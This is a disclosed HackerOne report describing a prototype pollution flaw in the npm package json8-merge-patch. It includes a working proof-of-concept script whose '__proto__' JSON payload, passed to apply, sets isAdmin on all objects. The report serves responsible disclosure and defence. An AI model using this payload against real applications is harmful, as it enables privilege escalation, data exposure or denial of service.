# [json8-merge-patch] Prototype Pollution

## Report Details
- **Report ID**: 980649
- **URL**: https://hackerone.com/reports/980649
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-09-12T11:53:16.089Z
- **Disclosed**: 2020-10-18T08:10:20.699Z

## Reporter
- **Username**: gkmr
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `Prototype Pollution` vulnerability in `json8-merge-patch`
The `apply` function fails to restrict access to prototypes of objects, allowing for modification of prototype behavior.

# Module

**module name:** `json8-merge-patch`
**version:** `v1.0.1`
**npm page:** `https://www.npmjs.com/package/json8-merge-patch`

## Module Description

JSON Merge Patch RFC 7396 toolkit for JavaScript.

## Module Stats

Weekly downloads: `517`

# Vulnerability

## Vulnerability Description

The `apply` function fails to restrict access to prototypes of objects, allowing for modification of prototype behavior, which may allow obtaining sensitive information/DoS/RCE.

## Steps To Reproduce:

1. Install `json8-merge-patch` module

     > `npm i json8-merge-patch`
2. create a file `poc.js` with content :
```
let json8mergepatch = require("json8-merge-patch");
var obj = {}
console.log("Before : " + obj.isAdmin);
json8mergepatch.apply(obj, JSON.parse('{ "__proto__": { "isAdmin": true }}'));
console.log("After : " + obj.isAdmin);
```
3. Execute using: `node poc.js`

##Output:
Before: undefined
After: true

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Windows 10
- NODEJS VERSION: v12.18.3
- NPM VERSION: 6.14.6

# Wrap up

- I contacted the maintainer to let them know: [Y] 
- I opened an issue in the related repository: [Y] 

Ref: https://github.com/sonnyp/JSON8/issues/113

## Impact

Can result in sensitive information disclosure/DoS/RCE. (depends on implementation)

## Attachments
No attachments
